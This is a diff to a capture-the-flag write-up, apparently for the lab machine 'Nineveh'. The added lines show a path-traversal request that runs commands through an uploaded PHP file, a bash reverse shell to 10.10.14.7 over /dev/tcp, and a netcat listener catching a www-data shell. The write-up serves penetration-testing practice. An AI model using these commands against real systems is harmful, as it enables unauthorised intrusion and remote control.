@@ -495,9 +495,46 @@ By this way, we can point to the `/var/tmp/exploit.php` and run a command with o
 
 <br />
 
+```bash
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/exploit.php&cmd=whoami
+```
 ![18](../../../assets/images/Nineveh/18.png)
 
 <br />
 
+With a RCE, we only need to entable a reverse shell and we will gain access to the system:
+
+⚠️ Note: Important to url-encode the `&` with `%26` to avoid encoding problems and be able to get the shell.
+
+<br />
+
+```bash
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/exploit.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261'
+```
+
+<br />
+
+Check the listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.43 60652
+bash: cannot set terminal process group (1385): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@nineveh:/var/www/html/department$ id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+We're in as `www-data`.
+
+<br />
+
+# Gain Initial Access - Via Knockd
 
 <br />
